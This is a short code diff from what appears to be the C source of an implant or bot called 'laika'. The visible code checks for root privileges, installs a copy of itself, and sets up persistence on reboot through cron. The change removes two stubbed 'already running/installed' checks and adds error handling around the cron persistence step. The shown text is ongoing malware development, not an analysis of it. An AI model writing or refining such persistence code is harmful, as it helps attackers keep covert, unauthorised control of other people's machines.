@@ -20,16 +20,6 @@
 
 static struct sLaika_socket laikaB_markerPort;
 
-/* check if laika is already running */
-bool laikaB_checkRunning() {
-    return true; /* stubbed for now */
-}
-
-/* check if laika is already installed on current machine */
-bool laikaB_checkPersist() {
-    return true; /* stubbed for now */
-}
-
 /* check if laika is running as super-user */
 bool laikaB_checkRoot() {
     return geteuid() == 0; /* user id 0 is reserved for root in 99% of the cases */
@@ -133,9 +123,13 @@ void laikaB_tryPersist() {
 
     LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);
 
-    /* enable persistence on reboot via cron */
-    if (!checkPersistCron(installPath))
-        tryPersistCron(installPath);
+    LAIKA_TRY
+        /* enable persistence on reboot via cron */
+        if (!checkPersistCron(installPath))
+            tryPersistCron(installPath);
+    LAIKA_CATCH
+        LAIKA_DEBUG("crontab not installed or not accessible!")
+    LAIKA_TRYEND
 #endif
 }
 
